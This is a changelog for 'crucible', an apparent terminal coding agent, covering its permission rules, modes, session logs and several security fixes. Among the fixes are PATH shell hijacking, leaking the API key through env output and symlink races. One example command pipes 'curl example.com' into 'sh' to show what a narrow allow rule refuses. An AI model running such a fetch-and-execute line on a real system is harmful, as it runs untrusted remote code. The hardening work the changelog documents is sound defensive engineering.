# Changelog

Notable changes to crucible. Format follows
[Keep a Changelog](https://keepachangelog.com/en/1.1.0/); versioning follows
[Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### Fixed

- **The workspace can no longer supply the shell.** The shell was spawned under
  a bare name, resolved wherever the spawn happened — and a command runs with
  the workspace as its working directory. An empty element on the `PATH` means
  the current directory to everything that resolves a name, so a file called
  `sh` written into the tree would have read every command line after it,
  including ones you were asked about and allowed. The shell is now resolved
  once, to an absolute path, when the tool is built.

- **A command no longer inherits crucible's environment.** `env` and `printenv`
  are ordinary things for a model to run, and every variable crucible was
  started with — your provider key among them — came back as tool output, onto
  the screen and into the next request. A command is now started with a short
  list of what a program needs to run at all, plus whatever the `env` setting
  adds. A command that needs more is told about it there.

### Changed

- **`allowEdits` asks before every command.** It used to run a shell command
  unasked when the line had been read and every path in it found inside the
  working directory — a proof a symbolic link could undo after the fact, since
  a shell reopens those paths by name. The mode is now what its name says: the
  tools that change files change them, and anything that starts a process asks.
  A command you run constantly wants an `allow` rule, or `fullAccess`.

## [0.0.9] - 2026-08-12

### Added

- **The cursor crosses a word at a time.** <kbd>Ctrl</kbd> or <kbd>Alt</kbd> held
  with <kbd>←</kbd> or <kbd>→</kbd> moves a word, and <kbd>Alt-B</kbd> and
  <kbd>Alt-F</kbd> do the same — so correcting the far end of a long line is no
  longer one arrow key per character. A word is a run of anything that is not a
  space, which makes a path one word.

### Changed

- **<kbd>Shift-Tab</kbd> into `fullAccess` takes effect on the press.** It used
  to go on screen and wait for <kbd>Enter</kbd> before it counted. The row under
  the box still says the mode and the box is still drawn in its colour, and the
  same key steps back out of it.

### Fixed

- **The transcript reads the model's markdown instead of printing it.** Headings,
  emphasis, inline code and fenced blocks lose their markers and are toned
  instead; the tone belongs to the row rather than to the text, so an answer
  wraps where it always did. Where there is no colour — a redirected run,
  `NO_COLOR`, `--color never` — every marker is left exactly where the model
  wrote it, so a piped answer is still a file of markdown.

- **A variable exported empty no longer outvotes the key beside it.**
  `ANTHROPIC_API_KEY=` is how a shell turns that provider off, and crucible
  counted it as a key held — so a machine with a real `OPENAI_API_KEY` beside it
  opened on `claude-sonnet-5` and then refused to start over the variable
  holding nothing. Only a variable holding a key picks the provider now. Where
  none does, a blank one still names itself in the refusal, as before.

- **The mode stays on screen while a turn is being written.** It used to leave
  with the box, so the longest stretch of a session was the one stretch that did
  not say what it was allowed to do. It now stands on its own row under the
  streaming answer, without the key hint the row under the box carries — nothing
  is reading a key until the turn ends. The row never reaches the scrollback:
  what stands there is a fact about the session rather than something that was
  said.

- **A session claim that could not be attempted no longer reads as a filesystem
  with no locks.** Where the `.lock` file beside a log could not be made at all,
  `--continue` went ahead as though the check had run and found nothing, which
  is the one case the check exists for. It stops with `could not claim the
  session log …` instead, having read nothing and changed nothing. A filesystem
  that genuinely has no locks is unaffected.

- **The welcome screen spells the program's name.** The `B` of the wordmark was
  drawn as a second `E`, so the first thing on screen read `CRUCIELE`. Nothing
  else moved: the mark is the same three rows and the same width.

- **`crucible` with no `--model` now asks the provider whose key you hold.** It
  went to Anthropic whatever the machine had, so a session set up with only
  `OPENAI_API_KEY` ran against a provider there was nothing to authenticate
  with. Exactly one key set picks that provider; both set, or neither, is
  Anthropic as before.

- **A model named nowhere is now the one that provider serves.** The fallback
  was one Claude name for every provider, so `--model openai/` with nothing
  configured asked OpenAI for a model OpenAI does not have. `anthropic` falls
  back to `claude-sonnet-5` and `openai` to `gpt-5.6-terra`. A run that named a
  model, or configured one, is unaffected.

- **<kbd>Enter</kbd> runs the command the open list is pointing at, rather than
  the letters typed.** One row is marked and <kbd>↑</kbd> and <kbd>↓</kbd> move
  the mark, so any command runs from the letters that name it without the rest
  being typed. A name typed in full runs that command rather than a longer one
  beginning the same way.

- **<kbd>Ctrl-C</kbd> against an empty prompt no longer ends the session on its
  own.** The first press says `press ctrl-c again to leave` under the mode; a
  second one within two seconds leaves. Any other key in between takes the offer
  back. A line being typed is still thrown away by the first press, as before.

### Internal

- `scripts/check.sh` refuses a merge conflict marker in any tracked file, and
  runs that scan first. A resolution that missed a line is caught by the
  compiler in a `.rs` file and by nothing at all in a changelog or a workflow;
  one reached `main` through five green jobs.

## [0.0.8] - 2026-08-12

### Added

- **A prompt is typed into a box, with the mode in force written under it.** The
  line is drawn as it arrives — the arrows, home, end, backspace, and a window
  that follows the cursor along a line wider than the terminal. A run whose
  input or output is redirected has no box and reads whole lines as before.

- **<kbd>Shift-Tab</kbd> steps the permission mode while you type.** `ask`, then
  `allowEdits`, then `fullAccess`, then round again, with the row under the box
  and the colour of the box itself saying which is in force. Stepping into
  `fullAccess` waits to be confirmed; the rules you wrote and anything already
  allowed for the session are untouched either way. `--continue` still starts
  from the configured mode rather than the stepped one.

- **A session opens with a welcome screen rather than two lines.** The release,
  the model and the working directory sit beside what the prompt reacts to. It
  fits itself to the terminal: two columns at eighty and above, one below that,
  and no frame at all under forty-six.

- **The welcome screen lists what was worked on in this directory.** The last
  few sessions started here, newest first, each with what it was first asked and
  how long ago it began. Reading them costs the same on a machine that has held
  crucible for a year as on one that installed it today: the names give the
  order, and only the newest few files are opened.

- **`output.glyphs` picks the characters crucible draws with.** `ascii` for a
  terminal whose font has no box drawing, where borders would otherwise show as
  hollow squares. `unicode` is the default and nothing detects it — a missing
  glyph is invisible to the program, so it is asked for.

- **`CRUCIBLE_CODE_CLEAR_SCREEN` empties the terminal before crucible draws.**
  Set it to `true` in `env`, or in the shell, to start from a bare screen and an
  empty scrollback. Off by default and ignored when output is redirected; a
  value that is not `1`, `true`, `0` or `false` is refused, naming the file and
  the line.

- **A session another crucible has open is refused rather than continued.**
  `--continue` in a second terminal in the same directory stops with `… is open
  in another crucible`, having read nothing and changed nothing. Two crucibles
  *starting* there are unaffected: they are two sessions, each recording its own
  log.

- **Commands: `/help`, `/model`, `/mode`, `/resume`, `/clear` and `/exit`.**
  Typing `/` opens the list above the box, filtered as you type, so the box and
  the mode under it stay where they are. `/mode allowEdits` names a mode
  outright instead of stepping to it. A command is answered without asking the
  provider and does not enter the transcript; a line that only looks like one —
  `/etc/hosts is wrong` — is still a prompt.

- **`/clear` forgets the transcript without ending the session.** The next
  prompt is the first the model sees, and the turns before it are not sent or
  paid for again. The same session, log and permission answers carry on, and the
  screen is left alone — what is above the box belongs to the terminal.

- **`/resume` switches to an earlier session in this directory without
  restarting.** It lists the last nine, newest first and numbered, and `/resume
  2` picks that one up: the session you were in is closed and stays readable,
  and the named one's transcript comes back. What it was allowed for the rest of
  that session is forgotten; the mode and your configured rules carry on.

- **`crucible_tui::cut` and `crucible_tui::clip`, the display-column count the
  renderer itself uses.** `cut` says where a string reaches a given number of
  columns — a wide character taking two, a combining mark none, a tab reaching
  its stop, and an emoji presentation selector taking the column it widens by —
  and `clip` returns that much of it. Anything composing a row of its own now
  measures it the way the tail that wraps it does.

### Changed

- **The session log format is version 2, so 0.0.7 logs cannot be continued.**
  `--continue` refuses them by name — `… was written by a different version of
  crucible` — and the welcome screen leaves them out of what was worked on here.
  Nothing is deleted or migrated; the files stay where they are.

- **<kbd>Ctrl-C</kbd> at the prompt throws the line away rather than ending
  crucible.** Pressing it again on an empty box leaves, as <kbd>Ctrl-D</kbd>
  does. During a turn it is the signal it always was.

- **A window resized during a redirected run flushes what is live.** `crucible >
  out.txt` used to drop the rows still in the live region, losing that much of
  the answer. They are written out instead, which puts a line break in the file
  where the resize happened.

### Fixed

- **`grep` keeps the matches it found in a file it could not finish reading.**
  One line that is not text used to discard every match already found in that
  file — often leaving `nothing matched`. The matches are reported, and a note
  names the files the search stopped partway through, so a gap in the answer is
  visible rather than silent. Files that could not be opened at all are named by
  that note too, where before they were passed over without a word.

- **A recursive delete is asked about even where it cannot leave the tree.**
  `rm -r` inside the workspace used to be allowed by the same reasoning that
  allows `rm` on one file. The flag that makes it recursive is now what puts it
  in front of you.

- **A narrow terminal no longer draws over the line above.** A tail one or two
  columns wide could emit a row wider than itself, and the renderer moves back
  over the width it counted. Anything that cannot fit in a row is dropped.

- **A permission rule that could not be saved leaves nothing behind.** When
  replacing the file failed, a `.writing.<pid>` copy of the whole document
  stayed in `.crucible`. It is removed; the error you see is unchanged.

- **Damage in the middle of a session log stops `--continue` rather than
  truncating the log to it.** A line this build cannot read with turns recorded
  after it is refused and the file is left as it is. Damage at the end still
  costs that line and nothing else.

- **A write to the log that fails part-way through cannot weld two lines
  together.** The next line written starts a line of its own, so a failed write
  costs the line it was on rather than the one after it as well.

- **A turn's tool calls are recorded before the tools run.** A turn that stopped
  between the model asking for a tool and the result arriving left a log whose
  last word was the prompt, so continuing it re-read files it had already
  edited.

- **An answer cut off mid-stream stays in the transcript.** Those deltas were on
  screen already, and a transcript without them is one the user and the model
  disagree about.

- **A log whose first line was never finished is passed over.** It holds no
  turns and names no workspace, and `--continue` used to append to it — after
  which nothing could find the session at all.

- **`write` takes an absolute path.** The directories a path needs are made by
  walking its parents, and the walk began at the filesystem root, so every
  absolute path was refused — including every path into a directory named by
  `permissions.extraDirectories`, which can only be named absolutely.

- **`glob` finds files in a directory reached through
  `permissions.extraDirectories`.** It reported nothing there while `grep`
  searched the same directory happily.

- **`bash` output is bounded as it is read, not only when it is reported.** A
  command producing gigabytes filled memory with bytes that were always going to
  be discarded. What the model sees is unchanged: the two ends, and how much was
  cut from between them.

- **`grep` stops at a binary file.** A vendored font or `.so` that happens to be
  valid UTF-8 was searched line by line, and those lines went back to the model
  with NUL bytes in them.

- **`read` has a ceiling on `limit`.** A large enough number pulled a whole
  vendored bundle into the transcript in one call. The notice on a truncated
  read already says how to ask for the next page.

- **`su` and `doas` are treated as wrapper programs, like `sudo`.** A command
  using one is asked about every time and no narrow rule covers it: `bash(su *)`
  reads as a rule about `su` and would have authorised every program on the
  machine.

- **A keep-alive with no payload no longer fails the turn.** Some proxies send
  one while the model is thinking; it was read as a payload that would not
  parse, discarding the answer that had already arrived. Both wires.

- **Tool call arguments are assembled onto the call they belong to.** Arguments
  arriving under an index other than the open call's, and a call announced with
  an id but no name, are refused on both wires instead of being folded into
  whichever call was open — which is one tool running on another tool's
  arguments.

- **A resize that changes only the height is noticed.** The live region is
  bounded by the height as much as by the width, and only the width was being
  watched.

- **Text is measured in display columns wherever it is wrapped or shortened.** An
  emoji presentation selector counted as no column left a drawn row a column
  short — one the terminal then wrapped itself, after which the next frame
  erased the wrong lines. The binary's `!` notices were clipped by counting
  characters instead: `日本語` came back at twice the width asked for, `⚠️` was
  cut early enough to part a character from the selector that widens it, and the
  ellipsis was added past the budget rather than taken out of it.

- **`.crucible/config.local.json` keeps its permissions when `always` writes to
  it.** The file is replaced by a rename, so one narrowed to `600` came back at
  whatever the account creates a file as — on the file that says what may run
  without being asked.

- **A terminal that fails mid-turn no longer detaches the thread writing the
  log.** The failure is held until the turn is over, so everything queued reaches
  the disk before crucible exits.

## [0.0.7] - 2026-08-10

### Added

- **Seven platforms.** Linux, macOS and Windows on x86-64 and ARM64, and FreeBSD
  on x86-64, each built on a machine of its own architecture. Windows is a real
  target rather than one that merely compiles: a session log is held private with
  an access control list, the home directory falls back to `USERPROFILE`, and the
  `bash` tool runs commands through an `sh.exe` — Git for Windows carries one, and
  the tool says what to install when there is none.

### Changed

- **An artifact is named for its platform rather than its target triple.**
  `crucible-0.0.7-linux-x86_64.tar.gz`, with no `v` in it, in place of
  `crucible-v0.0.6-x86_64-unknown-linux-gnu.tar.gz`. One `SHA256SUMS` covers the
  release instead of a `.sha256` beside each archive. Anything that fetches a
  release by name needs updating.

### Fixed

- **`--continue` works on Windows.** Trimming the last line of a log needs a
  handle that may rewrite the file, which an append handle is not granted there,
  so continuing any session failed.

- **A rule remembered on Windows matches the file it was minted from.** An
  `always` answer about `src\main.rs` wrote a rule with the separator escaped as
  a character it is not, so the same question came back next turn. Paths are
  spelled with `/`, which is what the pattern language has.

- **A rule naming an absolute path matches on Windows.** A resolved path carries
  the extended-length spelling, `\\?\C:\...`, which `deny read(C:/Users/you/**)`
  was never going to match. A rule that reads as protection and is none is worse
  than no rule.

- **`grep` and `glob` name a file the way a rule about it is written.** They
  reported Windows paths with the separator a rule cannot carry, so a rule
  written from what a search printed matched nothing.

- **`permissions.extraDirectories` takes a Windows path.** An entry is judged
  absolute by what the platform it runs on calls absolute, rather than by a
  leading `/` that only some platforms use.

- **A session log is born with the access control list that closes it.** The
  list came down from the directory, so there is no moment in which a log exists
  carrying what the user profile hands Administrators and SYSTEM.

## [0.0.6] - 2026-08-10

The answers that outlast the question. `always` writes the rule into the file
git ignores, so the next session starts already knowing — and `allowEdits`
stops asking about the commands it can prove change nothing outside the
workspace.

### Added

- **`always` writes the rule down.** Answering `a` at a permission question now
  puts an `allow` rule for that exact call into `.crucible/config.local.json` —
  the layer git ignores — so the next session starts already knowing. The rule
  is the narrowest one that covers the call, with any `*` in the command or the
  filename escaped rather than left to widen it, and the line under the question
  names both the rule and the file it went into. Everything already in that file
  stays byte for byte, including settings crucible has no name for.

  Calls no rule can describe — a command line that is several commands, or one
  whose text does not say what will run — are not offered `always` at all, and
  typing it there refuses rather than quietly granting a session. A file that
  cannot be written costs the rule and nothing else: the call runs, the session
  stops asking, and the rule is printed so it can be pasted in by hand.

- **`*` where a rule names a tool means every tool.** `deny *(.env)` is the
  whole of it in one line, rather than one rule per tool that can reach the
  file. It is the reading `*` already had inside the brackets, now in both
  positions.

### Changed

- **`allowEdits` now runs a command that only changes files in the workspace.**
  A `mkdir` is the same change to the same tree whether `write` made it or a
  shell did, and stopping to ask about one while waving the other through was a
  distinction nobody who typed `allowEdits` had made. The mode now runs a `bash`
  call when the line is one simple command, the program is `mkdir`, `rmdir`,
  `touch`, `rm`, `cp` or `mv`, every flag is one that carries no value of its
  own, and every path in it resolves inside the workspace after symbolic links.
  Everything else asks exactly as before, including a glob or a `~`, which the
  shell rewrites into a path that was never checked. This is not a list of safe
  commands — `rm -rf src` is on it — but a list of ones whose reach can be
  established; a `deny` rule still holds over all of them, and `ask` still asks.

- **`a` at a question now means `always`, and `s` means the session.** The
  session-long yes has moved to its own letter, because the two are different
  promises and one of them now writes a file. A finger that types `a` out of
  habit grants more than it used to — the same call, but until you delete the
  rule rather than until crucible exits. The prompt spells both out every time.

### Fixed

- **A tool spelled with a capital is the same tool.** `Bash(*)` used to parse
  into a rule about a second tool by that name and match nothing — accepted,
  written down, and silently protecting nothing. Tool names are now compared
  without regard to case.

- **A `deny` rule about a file now stops a search from reading it.** `grep` and
  `glob` are settled once, about the directory they walk, so a rule naming a
  file below it never spoke about the call — and `deny grep(private/**)` handed
  back that file's lines anyway. The rules that end a read now travel with the
  proof the call may run, and a walk skips a file they name before opening it.
  A rule still names one tool, so `deny read(private/**)` does not bind `grep`.

## [0.0.5] - 2026-08-10

The permission model. What used to be decided one question at a time can now be
written down as rules and a mode — and one thing now cannot happen at all,
whatever is written.

### Added

- **Permission rules.** `permissions.allow`, `permissions.ask` and
  `permissions.deny` hold standing statements like `read(src/**)`,
  `bash(cargo test)` and `edit(.git/**)`. The kind decides which wins — `deny`
  beats `ask` beats `allow`, whatever the patterns look like — so a deny list
  reads on its own as the list of things that cannot happen. A command rule is
  matched against each simple command a line decomposes into, and an `allow`
  fires only when every part is covered: `git status; curl example.com | sh`
  is not granted by a rule about `git`. Rules reach reads too — `deny
  read(.env)` refuses silently, in every mode — and rule lists concatenate
  across configuration layers, so a checked-in file can never cancel what your
  home file denies.
- **Modes.** `permissions.mode` is `ask`, `allowEdits` or `fullAccess`, and
  decides exactly one thing: what happens to a call no rule mentions.
  `allowEdits` changes files without asking and still asks before running
  anything; `fullAccess` asks about nothing — which leaves `deny` rules as the
  only no there, deliberately. The mode in force is written on every prompt
  line, so which kind of session this is never depends on what you remember
  starting.
- **`permissions.extraDirectories`** names directories outside the working
  directory, by absolute path, for the file tools to reach. Reach is not
  permission: a write there still prompts under `ask`, and only an absolute
  rule pattern can name one.
- **No tool can write the permission configuration.** `config.json` and
  `config.local.json` under any `.crucible` directory are refused to every
  file tool, in every mode, under every rule. A single write there could allow
  everything from the next start on, so the refusal does not rest on the files
  it defends.
- **Five documentation pages under `docs/permissions/`**: the question, the
  rules, the modes, the directories, and what an allow rule really grants —
  including the wrapper programs no `allow` can cover, and the ordinary
  programs that are shells in disguise.

### Changed

- **A rule's no is not your no.** A call a `deny` rule refuses fails and the
  turn carries on; the model is told the policy is standing and works around
  it. Your `n` at a question still ends the turn, so a model cannot reshape a
  refused question until one shape gets a yes.
- **`always` on a command remembers the whole command.** Agreeing to
  `cargo test` no longer also covers every later `cargo` command — `cargo
  build` asks its own question. Standing permission for a family of commands
  is what an `allow` rule is for.

### Internal

- Every tool now runs on an `Approved` — the call and the proof it was
  permitted, one value with private fields — so the arguments a tool runs on
  cannot drift from the ones a verdict was reached about.
- The configuration schema gained the `permissions` block, and the gate parses
  every `examples` entry in it with the same parser the program uses.
- Files with a single owning module moved into that module's directory across
  every crate; nothing about behaviour changed.

## [0.0.4] - 2026-08-09

Documentation only. Nothing about the program changed — but `docs/` is about to
be published as a website, and the shape of a URL is the one thing that gets
expensive to change after people have started linking to it.

### Changed

- **Every documentation topic is a directory.** `docs/permission.md` is now
  `docs/permissions/permissions.md`, with a `docs/permissions/index.md` beside
  it naming the topic; the other four topics moved the same way. A directory
  name is a public URL segment, so this is the layout the site will serve.
- **The instability notices are gone from the pages.** Three of them said what
  the top of this file says once. Somebody who opened one page to answer one
  question is not there to read a compatibility policy.

### Fixed

- Two links in this file pointed at documentation paths that no longer exist —
  GitHub renders a changelog against the default branch, so they had gone dead
  where anybody would actually click them.

### Internal

- `scripts/check.sh` refuses a decision identifier, an assumption label or the
  name of a planning directory anywhere under `crates/`, `src/`, `docs/` or
  `schema/`. Those notes are how this repository talks to itself; a stranger
  reading a shipped file cannot resolve one and has no reason to want to.
- `scripts/check.sh` resolves every repository-relative markdown link under
  `docs/` and at the root, which is what caught the two above.
- **`main` is behind a repository ruleset.** Nothing reaches it except through a
  pull request with `scripts/check.sh` and `scripts/bench.sh` green on it, and a
  `v*` tag can no longer be deleted or moved — which is a paragraph
  `RELEASING.md` already had, now enforced rather than remembered. Neither
  ruleset has a bypass actor, so both bind whoever holds admin. `RELEASING.md`
  documents the branch-and-pull-request flow that replaces the direct push to
  `main` it used to describe.

## [0.0.3] - 2026-08-09

Configuration files. Everything crucible could only be told on the command line
or through the environment can now be written down.

### Added

- **Configuration in JSON**, read from three files, nearest to the work last:

  ```
  ~/.crucible/config.json          yours, everywhere
  .crucible/config.json            this project's, checked in
  .crucible/config.local.json      this project's, yours alone
  ```

  A scalar takes the nearest layer that set it; an object is merged key by key,
  so a project naming one provider leaves your other one alone. The command line
  is nearer than all three. Every file is optional and a machine with none of
  them behaves exactly as before.

  Three blocks: `providers`, keyed by provider name, each taking a `model` and
  an `apiKeyEnv`; `env`, the variables the commands crucible runs are given; and
  `output`, holding `color` and `toolDetail`. See
  [`docs/configuration/configuration.md`](docs/configuration/configuration.md).

- **`apiKeyEnv`**, which points a provider at a different environment variable —
  what a second key for the same vendor needs. It takes a variable *name*, and a
  key still has no path into a file crucible reads or writes.

- **A checked-in file may not set an arbitrary `env` variable.** Anything in
  `.crucible/config.json` reaches everyone who clones the repository, so a name
  that is not crucible's own is refused there and pointed at
  `.crucible/config.local.json` instead. crucible's own names — the
  `CRUCIBLE_CODE_` prefix — are allowed, because those are knobs this program
  declares rather than somewhere a secret could hide. The refusal is structural
  and there is no setting that turns it off.

- **A JSON schema**, at
  [`schema/crucible-code-schema.json`](schema/crucible-code-schema.json). Adding
  `"$schema": "https://www.schemastore.org/crucible-code-schema.json"` to a
  file gets completion, validation and a sentence about each key from your
  editor. It is generated from the same declaration the parser walks and a gate
  compares it against the checked-in copy, so an editor that accepts a document
  and a crucible that refuses it would have to disagree with itself.

- **Refusals written for somebody with the file open.** A rejected document
  names the file, the dotted path, the line and column, and what was accepted
  instead — and where a key appears more than once it gives no position rather
  than a plausible wrong one:

  ```
  crucible: /home/you/api/.crucible/config.json: output.colour is not a setting
  crucible has at line 3, column 5 — accepted here: color, toolDetail
  ```

### Changed

- **crucible keeps its own files in `~/.crucible/`** — the configuration file
  and the session logs together. Sessions used to live under
  `$XDG_DATA_HOME/crucible/sessions`, which means nothing on Windows and is the
  wrong place on macOS.

  **Nothing is moved for you.** A sessions directory already at the old path
  keeps being used, so `--continue` still finds the work you were in the middle
  of; the new location is taken only by a machine that has neither.
  [`docs/sessions/sessions.md`](docs/sessions/sessions.md) says how to move it by hand if you want
  it moved.

  `CRUCIBLE_CODE_HOME` relocates the whole directory, as an absolute path, and
  turns off looking at the old tree. Because it is read to *find* the
  configuration file, it is the one setting of crucible's own that a
  configuration file cannot carry — writing it in one is refused rather than
  accepted and quietly ignored.

- **`--model` is optional and takes a bare provider.** `crucible --model
  openai/` names the provider and leaves the model to `providers.openai.model`;
  `crucible` on its own does the same for Anthropic. With nothing configured
  either way the model is still `claude-sonnet-5`.

## [0.0.2] - 2026-08-09

The gate that runs against a published artifact rather than a build of this
tree, and the defect it found the first time it ran.

### Added

- `scripts/smoke.sh` — the release gate that could not run before there was a
  release. It takes the published tarball, checks it against the published
  checksum, and runs it in a sandbox holding the binary, the dynamic loader and
  the libraries the binary itself names: no shell, no toolchain, no certificate
  bundle, no source tree, and a home directory a moment old. What that proves is
  not that the libraries it needs are there, which binding them guarantees, but
  the half no other gate can see — that nothing else on the build machine was
  holding it up. It reports the glibc floor, refuses a run whose `--version`
  disagrees with `Cargo.toml`, and requires that a machine with no key be told
  which variable it wants rather than left with a blank screen. Wired into
  `RELEASING.md` on both sides of the tag.

### Fixed

- A run whose output is redirected no longer writes the terminal title.
  `crucible > log` and `crucible | tee` were both getting the OSC sequence that
  names a tab — once on the way in and once when the guard handed the title
  back — and neither is a title once something other than a terminal has read
  it; they are twenty-two bytes in the middle of somebody's file. Setting one
  now goes through the only constructor there is, and it asks standard output
  whether it is a terminal before writing anything, so a caller cannot aim a
  title at a pipe. `scripts/smoke.sh` fails a release whose redirected run
  writes any escape sequence at all, which is how this was found: in the
  published 0.0.1 artifact rather than in the source.

### Documented

- The released binary needs **glibc 2.34 or newer** and nothing else from the
  system — no certificate store, no runtime. Measured from the binary rather
  than assumed, ignoring weak symbols, which is the difference between a floor
  and a version number that retires distributions this runs on perfectly well.

### Internal

- The report that a session has stopped being recorded is now gated from the
  binary's own tests. A log that fails every write cannot be built from outside
  the runner — every public way in ends at a real file — so the case where the
  last turn is still queued when input ends had no test, and deleting the code
  that reports it would have gone unnoticed. `crucible-runner` gains a `proof`
  feature that only the binary's `[dev-dependencies]` turns on, so the seam is
  absent from a release build; a `compile_error!` behind the feature is what
  proved that rather than cargo's documented behaviour being taken on trust.

## [0.0.1] - 2026-08-08

The first release: a coding agent you can hold a session with, and the gates
that say what it is allowed to become.

### Added

- A session that runs. `crucible` reads a prompt, streams the model's answer
  inline, runs tools, and asks before anything that changes a file or starts a
  process. `--continue` carries on the most recent session started in the
  current directory. An answer the provider cut short says so under the turn,
  with the token ceiling, the content filter and a paused turn named apart
  because the remedy differs for each. The bound on that: a stop reason this
  build has not heard of reads as an ordinary finish, so a vendor adding one is
  the case where a cut-short answer can still arrive looking complete.
- A startup that fails leaves no session behind. Everything that can fail on the
  way in runs before the session is started, so a wrong `--model` or an unset
  key writes nothing: an empty session would otherwise be the newest one for the
  directory, and `--continue` would offer it instead of the last real session.
- Two providers, chosen by `--model [provider/]model`: `anthropic` (the default
  for an unqualified name, keyed by `ANTHROPIC_API_KEY`) and `openai` (keyed by
  `OPENAI_API_KEY`). Authentication is a separate axis from the wire protocol —
  a provider is handed a resolved credential and never learns which kind it was.
- Six tools: `read`, `grep`, `glob`, `edit`, `write`, `bash`. Every one of them
  takes a permission token that only a verdict can mint, so code that has not
  obtained one cannot call the operation; a read mints its own, and a file
  change or a command asks first. `always` remembers the tool for a file change
  and the tool *and program* for a command, and is never written to disk. What a
  tool returns is bounded, and a result that is short says so in the result
  itself — more lines follow, a line was cut at a width, a listing stopped at
  its limit, output was still arriving, the command was stopped for running too
  long — because a silently trimmed result reads to the model as a complete one.
- Session log: one JSON object per line, one file per session, under
  `$XDG_DATA_HOME/crucible/sessions`. A log from a build with a different format
  is refused rather than half-understood. The log is `0600` and its directory
  `0700`, set on every start and every `--continue` rather than only at
  creation, because a transcript holds what was typed, what files were read and
  what commands printed — and a group-writable directory would let another
  account drop a log in for `--continue` to replay. A log torn mid-line by a
  crash costs that line, and the torn bytes are dropped from the file before the
  continued session appends to it; one damaged in the middle is refused outright
  rather than silently returning a session with a hole in it.
- `docs/` — getting started, providers and models, permission, and sessions.
- Cargo workspace: `crucible-core`, `crucible-provider`, `crucible-tools`,
  `crucible-runner`, `crucible-tui`, and the `crucible` binary. Dependencies
  point down only, enforced by cargo.
- `scripts/check.sh` — formatting, clippy with `-D warnings`, tests, a
  400-line-per-file cap, pinning checks for dependencies, GitHub Actions and the
  agent instruction files, a comment above every dependency saying why it is
  needed, and a check that CI stops excusing a failing budget once the first
  bench probe exists. CI runs the same script.
- `scripts/bench.sh` — one probe per performance budget, selectable by mode
  (`startup`, `mem`, `grep`, `stream`, or all of them). Writes a JSON document
  to stdout and a readable summary to stderr, so one run serves a pipeline and a
  human. Every budget reports `UNMEASURED` until its probe exists, and the script
  fails, so a release cannot claim a number nobody measured.
- Lint configuration encoding the project rules: no panicking paths, no ad-hoc
  terminal output, `forbid(unsafe_code)`, function-length and complexity limits.
- `CLAUDE.md` — the rules a gate cannot check, with `AGENTS.md` symlinked to it
  so every agent tool reads one file.
- `.claude/rules/` — one file per crate carrying the obligations that bind only
  inside it, scoped by `paths:` frontmatter so each is read when a file it
  claims is opened. They state what a change must do rather than restating what
  the module documentation already explains, which is what keeps them from
  becoming a second copy. `scripts/check.sh` fails a rule with no frontmatter or
  one aimed at a directory that no longer exists — either way nothing loads it,
  and it fails by staying silent.
- Agent skills for the procedures a rules file cannot carry: running and
  extending the gate, adding a dependency, and staying clean-room. Written once
  under `.claude/skills/` and symlinked from `.agents/skills/`, so Claude Code
  and Codex read the same text.
- `.codex/config.toml` — how Codex should run here. `network_access` is on
  because cargo cannot resolve crates.io without it.
- `.github/`: a CI workflow running `scripts/check.sh` and `scripts/bench.sh`
  — the second uploading its JSON as a build artifact, so a budget trend exists
  from the first pull request — plus a tag-triggered release workflow,
  Dependabot for cargo and actions, and issue and pull request templates.
- `deny.toml` and a weekly `audit` workflow — the other half of pinning. Nothing
  here moves on its own, so an advisory published against a version already
  pinned would never surface; a scan on a clock finds it, and the same scan
  refuses a licence that would make the MIT on the binary untrue or a dependency
  from anywhere but crates.io. It runs apart from `scripts/check.sh` because its
  answer changes when somebody else publishes rather than when you edit.
- Contributor Covenant 3.0 code of conduct, contribution guide, and a documented
  release procedure.
- `crucible_tui::Title` — sets the terminal tab title to `▽ crucible` and
  restores the terminal when dropped.

### Known limits

- A window resized mid-turn is noticed at the next prompt, not as it happens.
  Catching the signal a resize sends needs `unsafe`, which this workspace
  forbids, so what a resize costs is the turn it lands in.
- <kbd>Ctrl-C</kbd> ends the process rather than the turn, for the same reason.
  The session log is written as the turn goes, so `--continue` picks it up.
- Path containment resolves a path and the tool then acts on it, which is two
  steps rather than one. A path swapped for a symbolic link in between would be
  followed, so the check bounds a model working in the tree and not an attacker
  who can already write to it concurrently.
- A provider that pauses a turn is reported and left there. Sending the
  transcript back to carry on is a decision for the user, not something 0.0.x
  does by itself.
- A sessions directory or log left at anything other than `0700`/`0600` is set
  to it on start and on `--continue`, and a filesystem that refuses fails the
  run rather than writing a transcript somewhere the whole machine can read. One
  already at the right mode is not touched, so this costs nothing on the
  ordinary path and leaves a sticky bit where it was.
- Linux x86-64 only. The release builds one artifact.

[Unreleased]: https://github.com/augments-labs/crucible-code/compare/v0.0.9...HEAD
[0.0.9]: https://github.com/augments-labs/crucible-code/compare/v0.0.8...v0.0.9
[0.0.8]: https://github.com/augments-labs/crucible-code/compare/v0.0.7...v0.0.8
[0.0.7]: https://github.com/augments-labs/crucible-code/compare/v0.0.6...v0.0.7
[0.0.6]: https://github.com/augments-labs/crucible-code/compare/v0.0.5...v0.0.6
[0.0.5]: https://github.com/augments-labs/crucible-code/compare/v0.0.4...v0.0.5
[0.0.4]: https://github.com/augments-labs/crucible-code/compare/v0.0.3...v0.0.4
[0.0.3]: https://github.com/augments-labs/crucible-code/compare/v0.0.2...v0.0.3
[0.0.2]: https://github.com/augments-labs/crucible-code/compare/v0.0.1...v0.0.2
[0.0.1]: https://github.com/augments-labs/crucible-code/releases/tag/v0.0.1
